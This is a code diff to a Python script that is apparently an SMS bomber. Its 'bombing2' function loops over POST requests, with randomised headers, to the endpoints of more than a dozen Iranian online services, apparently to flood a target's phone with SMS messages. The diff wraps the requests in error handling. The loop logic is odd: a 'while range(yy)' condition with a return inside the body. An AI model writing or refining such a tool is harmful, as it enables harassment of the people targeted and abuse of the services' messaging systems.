@@ -176,40 +176,42 @@ def bombing2():
 
 #end heads
 #sent
-try:
      k=0
      while range(yy):
-         
-         random_head = random.choice(heads)
-         requests.post(url=url_divar,json=json_divar,headers=random_head)
+         try:
+             random_head = random.choice(heads)
+             requests.post(url=url_divar,json=json_divar,headers=random_head)
 
-         requests.post(url= url_snapp,json=json_snapp,headers=random_head)
+             requests.post(url= url_snapp,json=json_snapp,headers=random_head)
 
-         requests.post(url= url_sf,json=json_sf,headers=random_head)
+             requests.post(url= url_sf,json=json_sf,headers=random_head)
 
-         requests.post(url= url_sh,json=json_sh,headers=random_head) 
+             requests.post(url= url_sh,json=json_sh,headers=random_head) 
 
-         requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
+             requests.post(url= url_alibaba,json=json_alibaba,headers=random_head)
 
-         requests.post(url= url_cinma,json=json_cinma,headers=random_head)
+             requests.post(url= url_cinma,json=json_cinma,headers=random_head)
 
-         requests.post(url= url_digikala,json=json_digikala,headers=random_head)
+             requests.post(url= url_digikala,json=json_digikala,headers=random_head)
 
-         requests.post(url= url_jet,json=json_jet,headers=random_head)
+             requests.post(url= url_jet,json=json_jet,headers=random_head)
 
-         requests.post(url= url_virgool,json=json_virgool,headers=random_head)
+             requests.post(url= url_virgool,json=json_virgool,headers=random_head)
 
-         requests.post(url= url_aparat,json=json_aparat,headers=random_head)
+             requests.post(url= url_aparat,json=json_aparat,headers=random_head)
 
-         requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
+             requests.post(url= url_telewebion,json=json_telewebion,headers=random_head)
 
-         requests.post(url= url_sb,json=json_sb,headers=random_head)
+             requests.post(url= url_sb,json=json_sb,headers=random_head)
 
-         requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
+             requests.post(url= url_tpsi,json=json_tpsi,headers=random_head)
 
-         requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
+             requests.post(url=url_basalam ,json=json_basalam,headers=random_head)   
+         except:
+             print(f"Round {k+1} Not Send SMS ")
          print(f"Round {k+1} Complte SMS XD ")
          return True
+
 
 
 if __name__ == "__main__":
